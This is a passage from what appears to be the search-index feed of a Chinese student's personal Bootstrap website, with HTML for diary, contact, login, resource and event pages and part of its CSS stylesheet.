日常琐事罢了        </p>      </div>      <div id="carouselExampleControls" class="carousel slide" data-ride="carousel">        <div class="carousel-inner">          <div class="carousel-item active">            <div class="box">              <div class="img-box">                <img src="images/client.png" alt="" />              </div>              <div class="detail-box">                <h5>                  2021.12                </h5>                <p>                  东方栖霞园1次就打过normal了，简直不要太爽，但是又有点小小的后悔。。。                  应该留着考完试再玩的，lbl啊lbl,下次一定要好好学习啊                </p>              </div>            </div>          </div>          <div class="carousel-item">            <div class="box">              <div class="img-box">                <img src="images/client.png" alt="" />              </div>              <div class="detail-box">                <h5>                  今早2021.12.11                </h5>                <p>                  食堂1楼左边小米粥吃出苍蝇，还好阿姨给换了。想到还要做web课设就心烦，                  哦，我的上帝啊，为啥还要有那该死的web课设啊                </p>              </div>            </div>          </div>          <div class="carousel-item">            <div class="box">              <div class="img-box">                <img src="images/client.png" alt="" />              </div>              <div class="detail-box">                <h5>                  NULL                </h5>                <p>                  Null                </p>              </div>            </div>          </div>        </div>        <div class="btn-box">          <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">            <span class="sr-only">Previous</span>          </a>          <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">            <span class="sr-only">Next</span>          </a>        </div>      </div>    </div>  </section>  <!-- end client section -->  <!-- info section -->  <section class="info_section layout_padding">    <div class="container">      <div class="row">        <div class="col-md-3">          <div class="info_menu">            <h5>              QUICK LINKS            </h5>            <ul class="navbar-nav  ">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>                          </ul>          </div>        </div>        <div class="col-md-3">          <div class="info_course">            <h5>              label            </h5>            <p>               lubolin            </p>          </div>        </div>        <div class="col-md-5 offset-md-1">          <div class="info_news">            <h5>              Computer Science            </h5>            <div class="info_contact">              <!-- <a href="">                Location              </a> -->              <p>                计算机科学与技术（Computer Science and Technology）是国家一级学科，                下设信息安全、软件工程、计算机软件与理论、计算机系统结构、计算机应用技术、计算机技术等专业                主修大数据技术导论、数据采集与处理实践（Python）、Web前/后端开发、统计与数据分析、机器学习、                高级数据库系统、数据可视化、云计算技术、人工智能、自然语言处理、媒体大数据案例分析、网络空间安全、                计算机网络、数据结构、软件工程、操作系统等课程，以及大数据方向系列实验，                并完成程序设计、数据分析、机器学习、数据可视化、大数据综合应用实践、专业实训和毕业设计等多种实践环节。              </p>            </div>                      </div>        </div>      </div>    </div>  </section>  <!-- end info section -->  <!-- footer section -->  <footer class="container-fluid footer_section">    <p>lbl~ All rights reserved.</p>  </footer>  <!-- footer section -->  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>  <script type="text/javascript" src="js/bootstrap.js"></script><style>.copyrights{text-indent:-9999px;height:0;line-height:0;font-size:0;overflow:hidden;}</style><div class="copyrights">lbl</div></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/contact.html"/>
      <url>/sources/contact.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head>  <!-- Basic -->  <meta charset="utf-8" />  <meta http-equiv="X-UA-Compatible" content="IE=edge" />  <!-- Mobile Metas -->  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  <!-- Site Metas -->  <meta name="keywords" content="" />  <meta name="description" content="" />  <meta name="author" content="" />  <title>Label</title>  <!-- bootstrap core css -->  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />  <!-- fonts style -->  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,600,700&display=swap" rel="stylesheet" />  <!-- Custom styles for this template -->  <link href="css/style.css" rel="stylesheet" />  <!-- responsive style -->  <link href="css/responsive.css" rel="stylesheet" /></head><body class="sub_page">  <div class="hero_area">    <!-- header section strats -->    <header class="header_section">      <div class="container-fluid">        <nav class="navbar navbar-expand-lg custom_nav-container ">          <a class="navbar-brand" href="index.html">                      </a>          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">            <span class="navbar-toggler-icon"></span>          </button>          <div class="collapse navbar-collapse ml-auto" id="navbarSupportedContent">            <ul class="navbar-nav  ml-auto">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>            <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">              <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>            </form>          </div>        </nav>      </div>    </header>    <!-- end header section -->  </div><!-- contact section -->  <section class="contact_section ">    <div class="container">      <div class="row">        <div class="col-md-6">          <div class="detail-box">            <div class="heading_container">              <h3>                留言              </h3>              <p>                 欢迎留言              </p>            </div>          </div>        </div>        <div class="col-md-6">          <div class="contact-form">            <h5>              留言板            </h5>            <form action="">              <div>                <input type="text" placeholder="Your Name " />              </div>              <div>                <input type="text" placeholder="Phone Number" />              </div>              <div>                <input type="email" placeholder="Email Address" />              </div>              <div>                <input type="text" placeholder="你的留言..." class="input_message" />              </div>              <div class="d-flex justify-content-center">                <button type="submit" class="btn_on-hover">                  发送                </button>              </div>            </form>          </div>        </div>      </div>    </div>  </section>  <!-- end contact section -->     <!-- info section -->  <section class="info_section layout_padding">    <div class="container">      <div class="row">        <div class="col-md-3">          <div class="info_menu">            <h5>              QUICK LINKS            </h5>            <ul class="navbar-nav  ">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>          </div>        </div>        <div class="col-md-3">          <div class="info_course">            <h5>              NEFU            </h5>            <p>              东北林业大学（Northeast Forestry University），简称东北林大（NEFU）               ，位于黑龙江省哈尔滨市，是一所以林科为优势、林业工程为特色的中华人民共和国教育部直属高校，              由教育部、国家林业局、黑龙江省人民政府三方共建，国家“世界一流学科建设高校”，国家“211工程”、“985工程优势学科创新平台”重点建设高校，              高水平行业特色大学优质资源共享联盟成员高校，“双一流”农科联盟成员高校             </p>          </div>        </div>        <div class="col-md-5 offset-md-1">          <div class="info_news">            <h5>              Computer Science            </h5>            <div class="info_contact">              <!-- <a href="">                Location              </a> -->              <p>                计算机科学与技术（Computer Science and Technology）是国家一级学科，                下设信息安全、软件工程、计算机软件与理论、计算机系统结构、计算机应用技术、计算机技术等专业                主修大数据技术导论、数据采集与处理实践（Python）、Web前/后端开发、统计与数据分析、机器学习、                高级数据库系统、数据可视化、云计算技术、人工智能、自然语言处理、媒体大数据案例分析、网络空间安全、                计算机网络、数据结构、软件工程、操作系统等课程，以及大数据方向系列实验，                并完成程序设计、数据分析、机器学习、数据可视化、大数据综合应用实践、专业实训和毕业设计等多种实践环节。              </p>            </div>                      </div>        </div>      </div>    </div>  </section>  <!-- end info section -->  <!-- footer section -->  <footer class="container-fluid footer_section">    <p>lbl~ All rights reserved.</p>  </footer>  <!-- footer section -->  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>  <script type="text/javascript" src="js/bootstrap.js"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/login.html"/>
      <url>/sources/login.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head>  <!-- Basic -->  <meta charset="utf-8" />  <meta http-equiv="X-UA-Compatible" content="IE=edge" />  <!-- Mobile Metas -->  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  <!-- Site Metas -->  <meta name="keywords" content="" />  <meta name="description" content="" />  <meta name="author" content="" />  <title>Label</title>  <!-- bootstrap core css -->  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />  <!-- fonts style -->  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,600,700&display=swap" rel="stylesheet" />  <!-- Custom styles for this template -->  <link href="css/style.css" rel="stylesheet" />  <!-- responsive style -->  <link href="css/responsive.css" rel="stylesheet" /></head><body class="sub_page">  <div class="hero_area">    <!-- header section strats -->    <header class="header_section">      <div class="container-fluid">        <nav class="navbar navbar-expand-lg custom_nav-container ">          <a class="navbar-brand" href="index.html">                      </a>          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">            <span class="navbar-toggler-icon"></span>          </button>          <div class="collapse navbar-collapse ml-auto" id="navbarSupportedContent">            <ul class="navbar-nav  ml-auto">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>            <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">              <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>            </form>          </div>        </nav>      </div>    </header>    <!-- end header section -->  </div>  <!-- login section -->  <section class="login_section layout_padding">    <div class="container">      <div class="row">        <div class="col-md-6">          <div class="detail-box">            <h3>              注册            </h3>            <p>             在这里留下你的足迹吧~~            </p>            <a href="register.html">              register            </a>          </div>        </div>        <div class="col-md-6">          <div class="login_form">            <h5>              登 录            </h5>            <form action="">              <div>                <input type="email" placeholder="Email " />              </div>              <div>                <input type="password" placeholder="Password" />              </div>              <button type="submit">Login</button>            </form>          </div>        </div>      </div>    </div>  </section>  <!-- end login section -->  <!-- info section -->  <section class="info_section layout_padding">    <div class="container">      <div class="row">        <div class="col-md-3">          <div class="info_menu">            <h5>              QUICK LINKS            </h5>            <ul class="navbar-nav  ">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>          </div>        </div>        <div class="col-md-3">          <div class="info_course">            <h5>              NEFU            </h5>            <p>              东北林业大学（Northeast Forestry University），简称东北林大（NEFU）               ，位于黑龙江省哈尔滨市，是一所以林科为优势、林业工程为特色的中华人民共和国教育部直属高校，              由教育部、国家林业局、黑龙江省人民政府三方共建，国家“世界一流学科建设高校”，国家“211工程”、“985工程优势学科创新平台”重点建设高校，              高水平行业特色大学优质资源共享联盟成员高校，“双一流”农科联盟成员高校             </p>          </div>        </div>        <div class="col-md-5 offset-md-1">          <div class="info_news">            <h5>              Computer Science            </h5>            <div class="info_contact">              <!-- <a href="">                Location              </a> -->              <p>                计算机科学与技术（Computer Science and Technology）是国家一级学科，                下设信息安全、软件工程、计算机软件与理论、计算机系统结构、计算机应用技术、计算机技术等专业                主修大数据技术导论、数据采集与处理实践（Python）、Web前/后端开发、统计与数据分析、机器学习、                高级数据库系统、数据可视化、云计算技术、人工智能、自然语言处理、媒体大数据案例分析、网络空间安全、                计算机网络、数据结构、软件工程、操作系统等课程，以及大数据方向系列实验，                并完成程序设计、数据分析、机器学习、数据可视化、大数据综合应用实践、专业实训和毕业设计等多种实践环节。              </p>            </div>                      </div>        </div>      </div>    </div>  </section>  <!-- end info section -->  <!-- footer section -->  <footer class="container-fluid footer_section">    <p>lbl~ All rights reserved.</p>  </footer>  <!-- footer section -->  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>  <script type="text/javascript" src="js/bootstrap.js"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/course.html"/>
      <url>/sources/course.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head>  <!-- Basic -->  <meta charset="utf-8" />  <meta http-equiv="X-UA-Compatible" content="IE=edge" />  <!-- Mobile Metas -->  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  <!-- Site Metas -->  <meta name="keywords" content="" />  <meta name="description" content="" />  <meta name="author" content="" />  <title>Label</title>  <!-- bootstrap core css -->  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />  <!-- fonts style -->  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,600,700&display=swap" rel="stylesheet" />  <!-- Custom styles for this template -->  <link href="css/style.css" rel="stylesheet" />  <!-- responsive style -->  <link href="css/responsive.css" rel="stylesheet" /></head><body class="sub_page">  <div class="hero_area">    <!-- header section strats -->    <header class="header_section">      <div class="container-fluid">        <nav class="navbar navbar-expand-lg custom_nav-container ">          <a class="navbar-brand" href="index.html">                      </a>          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">            <span class="navbar-toggler-icon"></span>          </button>          <div class="collapse navbar-collapse ml-auto" id="navbarSupportedContent">            <ul class="navbar-nav  ml-auto">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>            <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">              <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>            </form>          </div>        </nav>      </div>    </header>    <!-- end header section -->  </div><!-- course section --><section class="course_section layout_padding-bottom">  <div class="side_img">  </div>  <div class="container">    <div class="heading_container">      <h3>        资源分享      </h3>      <p>        以下所有内容都来自于网络，与本人现实生活无关      </p>    </div>    <div class="course_container">      <div class="course_content">        <div class="box">          <img src="images/c-1.jpg" alt="" />          <a href="" class="">            <img src="images/link.png" alt="" />          </a>          <h5>            Touhou project<br />            project           </h5>        </div>        <div class="box">          <img src="images/c-2.jpg" alt="" />          <a href="" class="">            <img src="images/link.png" alt="" />          </a>          <h5>            音乐 <br />            Music~          </h5>        </div>      </div>      <div class="course_content">        <div class="box">          <img src="images/c-3.jpg" alt="" />          <a href="" class="">            <img src="images/link.png" alt="" />          </a>          <h5>            图片<br />                      </h5>        </div>        <div class="box">          <img src="images/c-4.jpg" alt="" />          <a href="" class="">            <img src="images/link.png" alt="" />          </a>          <h5>            游戏<br />                      </h5>        </div>        <div class="box">          <img src="images/c-5.jpg" alt="" />          <a href="" class="">            <img src="images/link.png" alt="" />          </a>          <h5>            其他资源          </h5>        </div>      </div>    </div>    <div class="btn-box">      <a href="">        Read More      </a>    </div>  </div></section><!-- end course section -->  <!-- info section -->  <section class="info_section layout_padding">    <div class="container">      <div class="row">        <div class="col-md-3">          <div class="info_menu">            <h5>              QUICK LINKS            </h5>            <ul class="navbar-nav  ">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>          </div>        </div>        <div class="col-md-3">          <div class="info_course">            <h5>              NEFU            </h5>            <p>              东北林业大学（Northeast Forestry University），简称东北林大（NEFU）               ，位于黑龙江省哈尔滨市，是一所以林科为优势、林业工程为特色的中华人民共和国教育部直属高校，              由教育部、国家林业局、黑龙江省人民政府三方共建，国家“世界一流学科建设高校”，国家“211工程”、“985工程优势学科创新平台”重点建设高校，              高水平行业特色大学优质资源共享联盟成员高校，“双一流”农科联盟成员高校             </p>          </div>        </div>        <div class="col-md-5 offset-md-1">          <div class="info_news">            <h5>              Computer Science            </h5>            <div class="info_contact">              <!-- <a href="">                Location              </a> -->              <p>                计算机科学与技术（Computer Science and Technology）是国家一级学科，                下设信息安全、软件工程、计算机软件与理论、计算机系统结构、计算机应用技术、计算机技术等专业                主修大数据技术导论、数据采集与处理实践（Python）、Web前/后端开发、统计与数据分析、机器学习、                高级数据库系统、数据可视化、云计算技术、人工智能、自然语言处理、媒体大数据案例分析、网络空间安全、                计算机网络、数据结构、软件工程、操作系统等课程，以及大数据方向系列实验，                并完成程序设计、数据分析、机器学习、数据可视化、大数据综合应用实践、专业实训和毕业设计等多种实践环节。              </p>            </div>                      </div>        </div>      </div>    </div>  </section>  <!-- end info section -->  <!-- footer section -->  <footer class="container-fluid footer_section">    <p>lbl~ All rights reserved.</p>  </footer>  <!-- footer section -->  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>  <script type="text/javascript" src="js/bootstrap.js"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/event.html"/>
      <url>/sources/event.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head>  <!-- Basic -->  <meta charset="utf-8" />  <meta http-equiv="X-UA-Compatible" content="IE=edge" />  <!-- Mobile Metas -->  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  <!-- Site Metas -->  <meta name="keywords" content="" />  <meta name="description" content="" />  <meta name="author" content="" />  <title>Label</title>  <!-- bootstrap core css -->  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />  <!-- fonts style -->  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,600,700&display=swap" rel="stylesheet" />  <!-- Custom styles for this template -->  <link href="css/style.css" rel="stylesheet" />  <!-- responsive style -->  <link href="css/responsive.css" rel="stylesheet" /></head><body class="sub_page">  <div class="hero_area">    <!-- header section strats -->    <header class="header_section">      <div class="container-fluid">        <nav class="navbar navbar-expand-lg custom_nav-container ">          <a class="navbar-brand" href="index.html">                     </a>          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">            <span class="navbar-toggler-icon"></span>          </button>          <div class="collapse navbar-collapse ml-auto" id="navbarSupportedContent">            <ul class="navbar-nav  ml-auto">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>            <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">              <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>            </form>          </div>        </nav>      </div>    </header>    <!-- end header section -->  </div><!-- event section --><section class="event_section layout_padding">  <div class="container">    <div class="heading_container">      <h3>        面试经历      </h3>      <p>        面试就是不同的人给你出相同内容的答卷...      </p>    </div>    <div class="event_container">      <div class="box">        <div class="img-box">          <img src="images/event-img1.jpg" alt="" />        </div>        <div class="detail-box">          <h4>            有待完善          </h4>          <h6>            8:00 AM - 9:00 AM          </h6>        </div>        <div class="date-box">          <h3>            <span>              15            </span>            March          </h3>        </div>      </div>      <div class="box">        <div class="img-box">          <img src="images/event-img2.jpg" alt="" />        </div>        <div class="detail-box">          <h4>            有待完善          </h4>          <h6>            10:00 AM - 11:00 AM          </h6>        </div>        <div class="date-box">          <h3>            <span>              15            </span>            May          </h3>        </div>      </div>    </div>    <div class="btn-box">      <a href="">        Read More      </a>    </div>  </div></section><!-- end event section -->  <!-- info section -->  <section class="info_section layout_padding">    <div class="container">      <div class="row">        <div class="col-md-3">          <div class="info_menu">            <h5>              QUICK LINKS            </h5>            <ul class="navbar-nav  ">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>          </div>        </div>        <div class="col-md-3">          <div class="info_course">            <h5>              NEFU            </h5>            <p>              东北林业大学（Northeast Forestry University），简称东北林大（NEFU）               ，位于黑龙江省哈尔滨市，是一所以林科为优势、林业工程为特色的中华人民共和国教育部直属高校，              由教育部、国家林业局、黑龙江省人民政府三方共建，国家“世界一流学科建设高校”，国家“211工程”、“985工程优势学科创新平台”重点建设高校，              高水平行业特色大学优质资源共享联盟成员高校，“双一流”农科联盟成员高校             </p>          </div>        </div>        <div class="col-md-5 offset-md-1">          <div class="info_news">            <h5>              Computer Science            </h5>            <div class="info_contact">              <!-- <a href="">                Location              </a> -->              <p>                计算机科学与技术（Computer Science and Technology）是国家一级学科，                下设信息安全、软件工程、计算机软件与理论、计算机系统结构、计算机应用技术、计算机技术等专业                主修大数据技术导论、数据采集与处理实践（Python）、Web前/后端开发、统计与数据分析、机器学习、                高级数据库系统、数据可视化、云计算技术、人工智能、自然语言处理、媒体大数据案例分析、网络空间安全、                计算机网络、数据结构、软件工程、操作系统等课程，以及大数据方向系列实验，                并完成程序设计、数据分析、机器学习、数据可视化、大数据综合应用实践、专业实训和毕业设计等多种实践环节。              </p>            </div>                     </div>        </div>      </div>    </div>  </section>  <!-- end info section -->  <!-- footer section -->  <footer class="container-fluid footer_section">    <p>lbl~ All rights reserved.</p>  </footer>  <!-- footer section -->  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>  <script type="text/javascript" src="js/bootstrap.js"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/css/style.css"/>
      <url>/sources/css/style.css</url>
      
        <content type="html"><![CDATA[body {  font-family: "Poppins", sans-serif;  color: #000000;  background-color: #ffffff;}.layout_padding {  padding: 90px 0;}.layout_padding2 {  padding: 45px 0;}.layout_padding2-top {  padding-top: 45px;}.layout_padding2-bottom {  padding-bottom: 45px;}.layout_padding-top {  padding-top: 90px;}.layout_padding-bottom {  padding-bottom: 90px;}.heading_container {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-orient: vertical;  -webkit-box-direction: normal;      -ms-flex-direction: column;          flex-direction: column;  -webkit-box-align: start;      -ms-flex-align: start;          align-items: flex-start;}.heading_container h3 {  font-weight: bold;  position: relative;  margin-bottom: 15px;}.heading_container h3::before {  content: "";  position: absolute;  top: 50%;  left: 2px;  width: 1px;  height: 65px;  background-color: #4bc5b8;  -webkit-transform: translateY(-50%) rotate(20deg);          transform: translateY(-50%) rotate(20deg);}/*header section*/.hero_area {  height: 100vh;  background-color: #b5caee;  background-image: url(../images/hero-bg.jpg);  background-size: cover;}.sub_page .hero_area {  height: auto;}.sub_page .contact_section {  margin: 75px 0;}.hero_area.sub_pages {  height: auto;}.header_section .container-fluid {  padding-right: 25px;  padding-left: 25px;}.header_section .nav_container {  margin: 0 auto;}.custom_nav-container .navbar-nav .nav-item .nav-link {  padding: 45px 15px 15px;  color: #ff3c00;  text-decoration: solid;  text-align: center;  position: relative;  text-transform: uppercase;}.custom_nav-container .navbar-nav .nav-item:hover .nav-link, .custom_nav-container .navbar-nav .nav-item.active .nav-link {  background-color: #e78d25ce;}.custom_nav-container .form-inline {  padding-top: 30px;}a,a:hover,a:focus {  text-decoration: none;}a:hover,a:focus {  color: initial;}.btn,.btn:focus {  outline: none !important;  -webkit-box-shadow: none;          box-shadow: none;}.user_option {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;}.custom_nav-container .nav_search-btn {  background-image: url(../images/search-icon.png);  background-size: 20px;  background-repeat: no-repeat;  background-position-y: 7px;  width: 35px;  height: 35px;  padding: 0;  border: none;}.navbar-brand {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-orient: vertical;  -webkit-box-direction: normal;      -ms-flex-direction: column;          flex-direction: column;  -webkit-box-align: end;      -ms-flex-align: end;          align-items: flex-end;}.navbar-brand h3 {  color: #ffffff;  font-weight: bold;  text-transform: uppercase;  margin: 0;}.navbar-brand span {  font-size: 16px;  font-weight: bold;  color: #133e3f;  margin-top: -10px;}.custom_nav-container {  z-index: 99999;  padding: 0;}.custom_nav-container .navbar-toggler {  outline: none;}.custom_nav-container .navbar-toggler .navbar-toggler-icon {  background-image: url(../images/menu.png);  background-size: 42px;}/*end header section*/.slider_section {  height: 90%;  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;  color: #ffffff;}.slider_section #carouselExampleIndicators {  width: 100%;}.slider_section .detail-box {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-orient: vertical;  -webkit-box-direction: normal;      -ms-flex-direction: column;          flex-direction: column;  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;  text-align: center;  margin-bottom: 110px;}.slider_section .detail-box h1 {  font-size: 4rem;  letter-spacing: 0.7rem;  font-weight: bold;  text-transform: uppercase;  padding: 15px;  border: 0.5px rgba(255, 255, 255, 0.2);}.slider_section .detail-box a {  display: inline-block;  padding: 10px 45px;  background-color: #b4eaeb;  border: 1px solid #49e8eb;  color: #ffffff;  margin-top: 35px;}.slider_section .detail-box a:hover {  background-color: transparent;  color: #4ff0f3;}.slider_section #carouselExampleIndicators {  bottom: 0;}.slider_section #carouselExampleIndicators li {  width: 15px;  height: 15px;  background-color: transparent;  border: 3px solid #ffffffa9;  border-radius: 10%;  opacity: 1;}.slider_section #carouselExampleIndicators li.active {  border-color: #ec5e1cbb;}.special_section .special_container {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  color: #ffffff;  background-color: #2abbbd86;  padding: 25px;  border-radius: 10px;}.special_section .special_container .box {  -webkit-box-flex: 1;      -ms-flex: 1;          flex: 1;  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-pack: center;      -ms-flex-pack: center;          justify-content: center;  padding-top: 10px;}.special_section .special_container .box .img-box {  width: 55px;  margin-right: 10px;}.special_section .special_container .box .img-box img {  max-width: 100%;}.special_section .special_container .box .detail-box a {  display: inline-block;  color: #fdda6e;  text-decoration: underline;  margin-top: 10px;}.special_section .special_container .box.b2 {  border-left: 1px solid #4e6e6f;  border-right: 1px solid #4e6e6f;}.about_section {  position: relative;}.about_section .side_img {  position: absolute;  bottom: 0;  right: 0;  width: 35px;}.about_section .side_img img {  width: 100%;}.about_section .row {  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;}.about_section .img_container .img-box {  width: 80%;}.about_section .img_container .img-box img {  width: 100%;}.about_section .img_container .img-box.b2 {  width: 40%;  margin-top: -25%;  margin-left: auto;  -webkit-box-shadow: 0 5px 15px 0 rgba(0, 0, 0, 0.1);          box-shadow: 0 5px 15px 0 rgba(0, 0, 0, 0.1);}.about_section .detail-box a {  display: inline-block;  padding: 10px 45px;  background-color: #3ecdcfa1;  border: 1px solid #b0e8e9;  color: #ffffff;  margin-top: 15px;}.about_section .detail-box a:hover {  background-color: transparent;  color: #56fcff;}.course_section {  position: relative;}.course_section .side_img {  position: absolute;  bottom: 25%;  left: 0;  width: 35px;}.course_section .side_img img {  width: 100%;}.course_section .heading_container {  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;  margin-bottom: 25px;}.course_section .heading_container h3::before {  left: -2px;}.course_section .course_container .course_content {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -ms-flex-wrap: wrap;      flex-wrap: wrap;  -webkit-box-pack: center;      -ms-flex-pack: center;          justify-content: center;}.course_section .course_container .course_content .box {  position: relative;  -ms-flex-preferred-size: 31%;      flex-basis: 31%;  margin: 1%;  border-radius: 10px;  overflow: hidden;}.course_section .course_container .course_content .box img {  width: 100%;}.course_section .course_container .course_content .box a {  position: absolute;  left: 35px;  bottom: 100px;  background-color: #c3ece8;  display: none;  -webkit-box-pack: center;      -ms-flex-pack: center;          justify-content: center;  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;  width: 45px;  height: 45px;  border-radius: 100%;}.course_section .course_container .course_content .box a img {  width: 20px;}.course_section .course_container .course_content .box a:hover {  opacity: .9;}.course_section .course_container .course_content .box h5 {  position: absolute;  left: 35px;  bottom: 